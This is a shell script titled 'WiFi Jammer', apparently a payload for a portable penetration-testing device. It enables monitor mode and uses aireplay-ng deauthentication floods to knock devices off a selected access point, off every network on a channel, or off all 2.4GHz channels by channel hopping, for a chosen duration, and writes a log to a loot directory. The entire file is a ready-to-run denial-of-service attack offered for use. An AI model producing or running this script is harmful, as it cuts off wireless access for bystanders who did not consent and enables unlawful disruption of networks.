#!/bin/sh
# Title: WiFi Jammer
# Author: NullSec
# Description: Continuous WiFi disruption using deauthentication
# Category: WiFi Attack

LOOT_DIR="/mmc/nullsec/jammer"
mkdir -p "$LOOT_DIR"

echo "📵 WIFI JAMMER"
echo "━━━━━━━━━━━━━━"

[ ! -d "/sys/class/net/wlan0" ] && { echo "[!] wlan0 not found!"; exit 1; }

echo "Jamming modes:"
echo "1) Jam specific network"
echo "2) Jam all networks on channel"
echo "3) Jam all 2.4GHz (channel hopping)"
echo ""
echo -n "Choice [3]: "
read MODE
MODE=${MODE:-3}

echo -n "Duration in seconds [300]: "
read DURATION
DURATION=${DURATION:-300}

echo ""
echo "[*] Enabling monitor mode..."
airmon-ng start wlan0 >/dev/null 2>&1
MON_IF=$(iw dev | grep -oE "wlan[0-9]mon" | head -1)
[ -z "$MON_IF" ] && MON_IF="wlan0mon"

LOG_FILE="$LOOT_DIR/jam_$(date +%Y%m%d_%H%M).log"
echo "WiFi Jammer Log - $(date)" > "$LOG_FILE"

case "$MODE" in
    1)
        echo "[*] Scanning for targets..."
        timeout 10 airodump-ng "$MON_IF" -w /tmp/jamtarget --output-format csv 2>/dev/null &
        sleep 10
        
        if [ -f /tmp/jamtarget-01.csv ]; then
            echo ""
            echo "Available targets:"
            grep -E "^[0-9A-F]{2}:" /tmp/jamtarget-01.csv | \
                awk -F',' '{print NR") "$1" CH:"$4" "$14}' | head -15
            echo ""
            echo -n "Select target: "
            read TARGET_NUM
            
            TARGET_LINE=$(grep -E "^[0-9A-F]{2}:" /tmp/jamtarget-01.csv | sed -n "${TARGET_NUM}p")
            TARGET_BSSID=$(echo "$TARGET_LINE" | cut -d',' -f1 | tr -d ' ')
            TARGET_CH=$(echo "$TARGET_LINE" | cut -d',' -f4 | tr -d ' ')
        else
            echo -n "Enter target BSSID: "
            read TARGET_BSSID
            echo -n "Enter channel: "
            read TARGET_CH
        fi
        
        echo ""
        echo "[*] Jamming $TARGET_BSSID on CH:$TARGET_CH..."
        iwconfig "$MON_IF" channel $TARGET_CH 2>/dev/null
        timeout $DURATION aireplay-ng -0 0 -a "$TARGET_BSSID" "$MON_IF" 2>&1 | tee -a "$LOG_FILE"
        ;;
        
    2)
        echo -n "Enter channel to jam: "
        read TARGET_CH
        
        echo ""
        echo "[*] Jamming all networks on CH:$TARGET_CH..."
        iwconfig "$MON_IF" channel $TARGET_CH 2>/dev/null
        timeout $DURATION aireplay-ng -0 0 -a FF:FF:FF:FF:FF:FF "$MON_IF" 2>&1 | tee -a "$LOG_FILE"
        ;;
        
    3)
        echo ""
        echo "[*] Channel-hopping jam mode..."
        END_TIME=$(($(date +%s) + DURATION))
        
        while [ $(date +%s) -lt $END_TIME ]; do
            for CH in 1 2 3 4 5 6 7 8 9 10 11; do
                [ $(date +%s) -ge $END_TIME ] && break
                
                echo "[📵] Jamming CH:$CH"
                echo "$(date +%H:%M:%S) JAM CH:$CH" >> "$LOG_FILE"
                
                iwconfig "$MON_IF" channel $CH 2>/dev/null
                aireplay-ng -0 10 -a FF:FF:FF:FF:FF:FF "$MON_IF" 2>/dev/null &
                sleep 2
                killall aireplay-ng 2>/dev/null
            done
        done
        ;;
esac

# Cleanup
killall aireplay-ng 2>/dev/null
airmon-ng stop "$MON_IF" >/dev/null 2>&1
rm -f /tmp/jamtarget* 2>/dev/null

echo ""
echo "━━━━━━━━━━━━━━━━━━━━"
echo "📵 JAMMING COMPLETE"
echo "━━━━━━━━━━━━━━━━━━━━"
echo "Duration: ${DURATION}s"
echo "Log: $LOG_FILE"
